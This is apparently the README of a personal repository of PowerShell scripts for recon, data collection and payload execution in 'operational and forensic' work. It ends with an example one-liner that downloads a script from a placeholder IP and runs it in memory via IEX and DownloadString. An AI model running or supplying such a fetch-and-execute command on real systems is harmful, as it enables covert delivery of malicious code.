# PowerShell Operational Scripts

This repository exists to centralise useful PowerShell scripts and one-liners I routinely use across different operational and forensic contexts. It is intended as a personal knowledgebase I can reference when recalling syntax or adapting techniques for live environments.

Each script or command in this repository has been tested and either directly used or adapted from trusted sources. Where possible, I've annotated usage examples and considerations to speed up future implementation.

## Structure

- `recon/` – Host and network enumeration
- `collection/` – Gathering user data, system details, and file contents
- `execution/` – Techniques for executing payloads or loading remote code
- `misc/` – One-liners, aliases, and admin utilities

## Example Use Case

To load a remote script into memory and execute it:

```powershell
IEX ((New-Object System.Net.WebClient).DownloadString('http://10.X.X.X/BAD_SCRIPT.ps1'))

